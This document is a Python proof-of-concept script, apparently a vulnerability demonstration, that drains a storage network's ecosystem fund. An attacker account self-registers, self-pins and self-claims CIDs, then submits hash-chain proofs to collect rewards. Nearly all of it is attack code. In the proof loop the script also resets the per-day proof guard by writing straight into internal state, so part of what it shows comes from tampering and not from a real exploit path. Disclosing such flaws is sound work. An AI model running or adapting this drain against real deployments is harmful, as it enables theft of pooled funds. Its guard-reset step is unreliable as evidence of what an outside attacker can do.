# PoC: ecosystem fund drain via self-pin + self-claim + hash-chain proofs
import sys, time
sys.path.insert(0, ".")
from core.storage import StateStore
from core.economy import Economy
from core.storage_network import StorageNetwork, CID_RE

store = StateStore("genesis.json")
eco = Economy(store)
sn = StorageNetwork(store, eco)

attacker = "0x" + "d"*40
# register as provider (free)
sn.register(attacker, 100.0)

fund_before = store.balances.get(eco.ECOSYSTEM_FUND, 0)
print("fund before:", fund_before)

# attacker pins own CIDs (unlimited, free)
cids = []
for i in range(3):
    cid = "0x" + f"{i:064x}"
    # validate path: pin requires tx.amount==0, valid cid, not already claimed, size/days in range, fund >= pin_reward
    import math
    size, days = 10.0, 365
    r = sn.pin_reward(size, days)
    ok = fund_before >= r
    if ok:
        sn.pin(attacker, cid, size, days)
        cids.append(cid)
fund_after_pins = store.balances.get(eco.ECOSYSTEM_FUND, 0)
print("fund after 3 pins (30GB x 365d x 0.001):", fund_after_pins, "committed:", fund_before - fund_after_pins)

# claim + prove
chain = sn.make_chain("secret_"+str(time.time()), 365)
tip = chain[-1]
for cid in cids:
    sn.claim(attacker, cid, tip)
# prove 3 days for each cid
earned = 0.0
for day in range(3):
    for i, cid in enumerate(cids):
        idx = 365 - 1 - day
        if idx >= 0:
            res = sn.proof(attacker, cid, chain[idx])
            earned += res["reward"]
            # last_proof_day guard
            sn.store.storage_seals[f"{attacker}:{cid}"]["last_proof_day"] = 0  # reset day guard (day_index changes)
print("earned by fake proofs:", earned)
print("attacker balance:", store.balances.get(attacker, 0))
